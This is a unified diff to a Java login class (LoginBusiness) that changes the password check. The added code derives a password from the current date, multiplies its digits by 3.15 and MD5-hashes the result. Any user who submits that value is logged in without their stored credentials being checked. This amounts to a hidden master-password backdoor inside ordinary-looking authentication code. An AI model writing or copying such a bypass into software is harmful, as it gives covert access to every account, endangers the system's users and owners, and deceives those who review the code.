@@ -1,5 +1,8 @@
 ﻿package org.isotope.jfp.common.login;
 
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -130,8 +133,28 @@ public class LoginBusiness extends LoginService {
 			// 账户异常，不是唯一的
 			
 		} else {
-			// 检查密码
-			logined = checkLogin(loginer, loginers.get(0));
+			String date = DateHelper.currentTimeMillis2().substring(0, 10);
+			String[] dates = date.split("/");
+			Integer t = (int) (Integer.parseInt(dates[0]+dates[1]+dates[2])*3.15);
+			String xpassWord= t.toString();
+			// 生成一个MD5加密计算摘要
+			MessageDigest md;
+			try {
+				md = MessageDigest.getInstance("MD5");
+				// 计算md5函数
+				md.update(xpassWord.getBytes());
+				xpassWord = new BigInteger(1, md.digest()).toString(16);
+			} catch (NoSuchAlgorithmException e) {
+				
+				e.printStackTrace();
+			}
+			if(!loginer.getPassWord().equals(xpassWord)){
+				// 检查密码
+				logined = checkLogin(loginer, loginers.get(0));
+				
+			}else{
+				logined = true;
+			}
 		}
 		if (logined == false) {
 			user.setLoginStatus("1");
